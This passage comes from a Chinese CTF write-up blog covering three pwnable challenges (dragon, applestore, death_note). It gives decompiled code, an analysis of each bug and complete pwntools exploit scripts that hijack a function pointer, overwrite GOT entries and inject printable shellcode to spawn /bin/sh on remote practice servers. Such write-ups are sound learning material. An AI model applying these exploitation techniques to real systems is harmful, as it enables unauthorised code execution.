+  _DWORD *ptr; // [esp+14h] [ebp-14h]
+  dragon2 *dragon; // [esp+18h] [ebp-10h]
+
+  ptr = malloc(0x10u);
+  dragon = malloc(0x10u);
+  v1 = Count++;
+  if ( v1 &amp; 1 )
+  {
+    *&amp;dragon-&gt;sth = 1;
+    LOBYTE(dragon-&gt;HP) = 80;
+    BYTE1(dragon-&gt;HP) = 4;
+    dragon-&gt;Regeneration = 10;
+    dragon-&gt;STR = PrintMonsterInfo;
+    puts(&quot;Mama Dragon Has Appeared!&quot;);
+  }
+  else
+  {
+    *&amp;dragon-&gt;sth = 0;
+    LOBYTE(dragon-&gt;HP) = 50;
+    BYTE1(dragon-&gt;HP) = 5;
+    dragon-&gt;Regeneration = 30;
+    dragon-&gt;STR = PrintMonsterInfo;
+    puts(&quot;Baby Dragon Has Appeared!&quot;);
+  }
+  if ( a1 == 1 )
+  {
+    *ptr = 1;
+    ptr[1] = 42;
+    ptr[2] = 50;
+    ptr[3] = PrintPlayerInfo;
+    v3 = PriestAttack(ptr, dragon);
+  }
+  else
+  {
+    if ( a1 != 2 )
+      return;
+    *ptr = 2;
+    ptr[1] = 50;
+    ptr[2] = 0;
+    ptr[3] = PrintPlayerInfo;
+    v3 = KnightAttack(ptr, dragon);
+  }
+  if ( v3 )
+  {
+    puts(&quot;Well Done Hero! You Killed The Dragon!&quot;);
+    puts(&quot;The World Will Remember You As:&quot;);
+    v2 = malloc(0x10u);
+    __isoc99_scanf(&quot;%16s&quot;, v2);
+    puts(&quot;And The Dragon You Have Defeated Was Called:&quot;);
+    (dragon-&gt;STR)(dragon);
+  }
+  else
+  {
+    puts(&quot;\nYou Have Been Defeated!&quot;);
+  }
+  free(ptr);
+}
+</code></pre>
+<p>刚刚做完echo2，就留意了下堆，很明显有一个uaf，可以通过打赢龙来要回来，</p>
+<p><strong>ptr</strong>指向一个龙的结构体，第一个参数就是<strong>打印龙信息的函数</strong>，我们可以覆盖这个值，指向后门</p>
+<p><code>SecretLevel</code></p>
+<pre><code class="language-assembly">.text:08048D78 ; __unwind {
+.text:08048D78                 push    ebp
+.text:08048D79                 mov     ebp, esp
+.text:08048D7B                 sub     esp, 28h
+.text:08048D7E                 mov     eax, large gs:14h
+.text:08048D84                 mov     [ebp+var_C], eax
+.text:08048D87                 xor     eax, eax
+.text:08048D89                 mov     dword ptr [esp], offset aWelcomeToSecre ; &quot;Welcome to Secret Level!\nInput Passwor&quot;...
+.text:08048D90                 call    _printf
+.text:08048D95                 lea     eax, [ebp+s1]
+.text:08048D98                 mov     [esp+4], eax
+.text:08048D9C                 mov     dword ptr [esp], offset a10s ; &quot;%10s&quot;
+.text:08048DA3                 call    ___isoc99_scanf
+.text:08048DA8                 mov     dword ptr [esp+4], offset s2 ; &quot;Nice_Try_But_The_Dragons_Won't_Let_You!&quot;
+.text:08048DB0                 lea     eax, [ebp+s1]
+.text:08048DB3                 mov     [esp], eax      ; s1
+.text:08048DB6                 call    _strcmp
+.text:08048DBB                 test    eax, eax
+.text:08048DBD                 jnz     short loc_8048DD9
+.text:08048DBF                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;
+.text:08048DC6                 call    _system
+.text:08048DCB                 mov     eax, [ebp+var_C]
+.text:08048DCE                 xor     eax, large gs:14h
+.text:08048DD5                 jz      short locret_8048DF6
+.text:08048DD7                 jmp     short loc_8048DF1
+....................................
+</code></pre>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+	sla('[ 2 ] Knight','1')
+	sl(&quot;3&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;2&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;2&quot;)
+
+	sla('[ 2 ] Knight','1')
+	sl(&quot;3&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;2&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;2&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;2&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;3&quot;)
+	sl(&quot;2&quot;)
+
+	sla(&quot;The World Will Remember You As:&quot;,p32(0x08048DBF))
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;25494&quot;,0,1)
+</code></pre>
+<h2>pwnable_applestore</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<p><img src="https://s3.ax1x.com/2021/03/12/6Ufqu6.png" alt="checksec" /></p>
+<ul>
+<li>IDA</li>
+</ul>
+<p>由<code>add</code>和<code>insert</code>可以逆向出每一个设备的结构体</p>
+<pre><code class="language-c">typedef struct shop
+{
+    char *name;
+    int price;
+    Shop *bk;
+    Shop *fd;
+}Shop,PShop
+</code></pre>
+<p><code>delete</code></p>
+<pre><code class="language-c">......  
+while ( item )
+  {
+    if ( v1 == idx )
+    {
+      BK = item-&gt;bk;
+      FD = item-&gt;fd;
+      if ( FD )
+        FD-&gt;bk = BK;
+      if ( BK )
+        BK-&gt;fd = FD;
+      printf(&quot;Remove %d:%s from your shopping cart.\n&quot;, v1, item-&gt;Name);
+      return __readgsdword(0x14u) ^ v7;
+    }
+    ++v1;
+    item = item-&gt;bk;
+  }
+.......
+</code></pre>
+<p>这功能是把chunk从item双链中取出，但是只校验了FD、BK的存在，没有校验合理性，如果我们可以控制 <strong>Item</strong> 的<strong>fd、bk</strong>，就能实现 <strong>unlink</strong> 的效果</p>
+<ul>
+<li>栈内变量覆盖</li>
+</ul>
+<p>那么如何控制<strong>fd、bk</strong></p>
+<p><code>checkout</code></p>
+<pre><code class="language-c">  v4 = __readgsdword(0x14u);
+  total = cart();
+  if ( total == 7174 )
+  {
+    puts(&quot;*: iPhone 8 - $1&quot;);
+    asprintf(&amp;a1, &quot;%s&quot;, &quot;iPhone 8&quot;);
+    a1_4 = 1;
+    insert(&amp;a1);
+    total = 7175;
+  }
+  printf(&quot;Total: $%d\n&quot;, total);
+  puts(&quot;Want to checkout? Maybe next time!&quot;);
+</code></pre>
+<p>我们回顾<code>add</code>，发现每一个 <strong>item</strong> 都是以堆的方式存在双链表中，而当总价为7174时，会赠送price为1的item，而这个item是在栈上面的，但是如何实现栈的修改呢？</p>
+<p>有两个可以利用的漏洞点</p>
+<ul>
+<li><code>Cart</code></li>
+</ul>
+<pre><code class="language-c">int cart()
+{
+  signed int j; // eax
+  signed int counter; // [esp+18h] [ebp-30h]
+  int total; // [esp+1Ch] [ebp-2Ch]
+  Shop *I; // [esp+20h] [ebp-28h]
+  char buf; // [esp+26h] [ebp-22h]
+  unsigned int v6; // [esp+3Ch] [ebp-Ch]
+
+  v6 = __readgsdword(0x14u);
+  counter = 1;
+  total = 0;
+  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);
+  fflush(stdout);
+  my_read(&amp;buf, 0x15u);
+  if ( buf == 'y' )
+  {
+    puts(&quot;==== Cart ====&quot;);
+    for ( I = item_804B070; I; I = I-&gt;bk )
+    {
+      j = counter++;
+      printf(&quot;%d: %s - $%d\n&quot;, j, I-&gt;Name, I-&gt;price);
+      total += I-&gt;price;
+    }
+  }
+  return total;
+}
+</code></pre>
+<p>这里看上去没问题，但是我们仔细在栈帧上看</p>
+<p><img src="https://s3.ax1x.com/2021/03/12/6Uob7V.png" alt="stack" /></p>
+<p><strong>这样就控制了 fd、bk</strong></p>
+<ul>
+<li>泄露libc</li>
+</ul>
+<p>然后我们就想泄露libc</p>
+<p><code>Cart</code>里面会输出当前所有的Item，而之前我们已经可以控制 <strong>item</strong> 的<strong>fd</strong>和<strong>bk</strong>，那先换为 <strong>atoi@got</strong>，这样去泄露</p>
+<p>因为程序是 <strong>Partial RELRO</strong> ，所以可以覆盖got表实现getshell</p>
+<ul>
+<li>如何得到7174</li>
+</ul>
+<p>这个穷举也可</p>
+<pre><code class="language-python">total = 0
+counter = 1
+while 1:
+	total += 199*counter
+	if (7174-total)%299==0:
+		print counter
+		print (7174-total)/299
+		break
+	total = 0
+	counter+=1
+</code></pre>
+<p>6个item_1，20个item_2</p>
+<ul>
+<li>
+<p>思路</p>
+</li>
+<li>
+<p>控制 <strong>item</strong> 的<strong>fd</strong>和<strong>bk</strong>，那先换为 <strong>atoi@got</strong>，泄露libc</p>
+</li>
+<li>
+<p>在<code>delete</code> Item-&gt;fd=aoti-8，Item-&gt;bk=system，将<code>atoi</code>换为<code>system</code></p>
+</li>
+<li>
+<p>getshell</p>
+</li>
+</ul>
+<p>但是控制 <strong>item</strong> 的<strong>fd</strong>和<strong>bk</strong>的机会只有一次，无法完成填入system的参数，后面看Writeup才知道还有一种方法</p>
+<blockquote>
+<p>可以通过libc中的environ来泄露栈地址， 泄露了栈地址后通过调试算出偏移可以得到delete函数的ebp地址，delete函数中的ebp指向的是handler函数中的ebp
+ebp -&gt; handler_ebp</p>
+<p>可以通过改写handler_ebp 为got_atoi + 0x22来完成对got表的覆写</p>
+<p>从delete函数返回到handler函数中， 还原栈帧的过程中ebp 的值为改写成got_atoi - 0x22, 这样在调用my_read 函数中时可以对got_atoi 进行覆写， 改写了got表后要考虑的就是/bin/sh 的位置， 可以看到atoi 的参数就是刚刚输入的数据， 这时可以输入p32(system) + &quot;|| /bin/sh&quot;或 p32(system) + “;/bin/sh” 来绕过system 调用/bin/sh
+————————————————
+版权声明：本文为CSDN博主「苍崎青子」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+原文链接：https://blog.csdn.net/qq_43189757/article/details/102850665</p>
+</blockquote>
+<p>这里再强调几个概念：</p>
+<p>EBP：栈底指针该寄存器</p>
+<p>ESP：栈顶指针寄存器</p>
+<p>程序运行时栈地收缩或扩张，也就是ebp和esp的增大或减小</p>
+<p>当我们<code>delete</code>结束时，返回到<code>handle</code>，当<code>handle</code>恢复栈时，假设再返回时我们把ebp变成了 <strong>atoi@got+0x22</strong></p>
+<p>此时的栈</p>
+<p><img src="https://s3.ax1x.com/2021/03/12/6a9311.png" alt="" /></p>
+<p>利用EBP收缩让 <strong>atoi@got+0x22</strong>变为<code>handle</code>的EBP，然后泄露<code>environ</code>来计算栈的地址来修复</p>
+<p>我们构造的</p>
+<p><img src="https://s3.ax1x.com/2021/03/12/6UjHBQ.png" alt="change atoi" /></p>
+<p>这个时候<code>atoi@got</code>立马变成<code>system</code>，执行system(&quot;SYS_ADDR||/bin/sh;&quot;)，从而getshell</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+# libc = ELF(&quot;libc-2.23.so&quot;)
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def cmd(ch):
+	sla(&quot;&gt; &quot;,ch)
+
+def List():
+	cmd(1)
+
+def Add(kind):
+	cmd(2)
+	sla(&quot;Device Number&gt; &quot;,kind)
+
+def free(idx):
+	cmd(3)
+	sla(&quot;Item Number&gt; &quot;,idx)
+
+def Cart(payload):
+	cmd(4)
+	sla(&quot;Let me check your cart. ok? (y/n) &gt; &quot;,payload)
+
+def checkout(payload):
+	cmd(5)
+	sla(&quot;Let me check your cart. ok? (y/n) &gt; &quot;,payload)
+
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+	for i in range(6):
+		Add(&quot;1&quot;)
+	for i in range(20):
+		Add(&quot;2&quot;)
+
+	checkout(&quot;y&quot;)
+	Cart(&quot;ya&quot;+p32(elf.got[&quot;atoi&quot;])+p32(0))
+
+	libcbase = u32(ru(&quot;\xf7&quot;)[-4:])-libc.sym[&quot;atoi&quot;]
+	environ = libcbase + libc.sym[&quot;environ&quot;]
+	system = libcbase + libc.sym[&quot;system&quot;]
+	lg(&quot;libcbase&quot;,libcbase)
+	lg(&quot;environ&quot;,environ)
+	lg(&quot;system&quot;,system)
+	
+	Cart('ya' + p32(environ)+ p32(0))
+	ru(&quot;27: &quot;)
+	stack = u32(sh.recv(4))
+	lg(&quot;stack&quot;,stack)
+	payload = '27' + p32(0) + p32(0)
+	payload += p32(elf.got[&quot;atoi&quot;] + 0x22) + p32(stack - 0x100 - 0xc)
+	free(payload)
+	sla(&quot;&gt; &quot;, p32(system) + &quot;||/bin/sh&quot;)
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;25844&quot;,0,0)
+</code></pre>
+<h2>pwnable_death_note</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>一开始还以为是堆的题，思路一直没转过来，后来看wp才知道是栈上的shellcode（怪不得NX没开，开了Canary）</p>
+<p><code>add_note</code></p>
+<pre><code class="language-c"> printf(&quot;Index :&quot;);
+  idx = read_int();
+  if ( idx &gt; 10 )
+  {
+    puts(&quot;Out of bound !!&quot;);
+    exit(0);
+  }
+  printf(&quot;Name :&quot;);
+  read_input(s, 0x50u);
+  if ( !is_printable(s) )
+  {
+    puts(&quot;It must be a printable name !&quot;);
+    exit(-1);
+  }
+  note[idx] = strdup(s);                        // 内部调用malloc
+  puts(&quot;Done !&quot;);
+</code></pre>
+<ul>
+<li>这里过滤了我们的输入为可见字符，但是只能输入0x50</li>
+<li>输入的idx可以是负数，所以可以写到 <strong>GOT</strong> 表</li>
+</ul>
+<p>这样我们只需要让shellcode为可见字符串组成就行了，一开始我想到的是用 AE64 这个工具，但是生成的shellcode过长，看了看wp的shellcode</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def cmd(ch):
+	sla(&quot;Your choice :&quot;,ch)
+
+def add(idx,name):
+	cmd(1)
+	sla(&quot;Index :&quot;,idx)
+	sla(&quot;Name :&quot;,name)
+
+def show(idx):
+	cmd(2)
+	sla(&quot;Index :&quot;,idx)
+
+def free(idx):
+	cmd(3)
+	sla(&quot;Index :&quot;,idx)
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+
+	note = 0x804A060
+	# obj = AE64()
+	# sc = obj.encode(asm(shellcraft.sh()))
+	shellcode = '''
+    /* execve(path='/bin///sh', argv=0, envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    push esp
+    pop ebx
+   /*rewrite shellcode to get 'int 80'*/
+    push edx
+    pop eax
+    push 0x60606060
+    pop edx
+    sub byte ptr[eax + 0x35] , dl
+    sub byte ptr[eax + 0x35] , dl
+    sub byte ptr[eax + 0x34] , dl
+    push 0x3e3e3e3e
+    pop edx
+    sub byte ptr[eax + 0x34] , dl
+    /*set zero to edx*/
+    push ecx
+    pop edx
+   /*set 0x0b to eax*/
+    push edx
+    pop eax
+    xor al, 0x40
+    xor al, 0x4b
+  /*foo order,for holding the  place*/
+    push edx
+    pop edx
+    push edx
+    pop edx
+'''
+	sc = asm(shellcode)+&quot;\x6b\x40&quot;
+	add((elf.got[&quot;puts&quot;]-note)/4,sc)
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;25938&quot;,0,1)
+</code></pre>
+
+</div>
+</div></body>
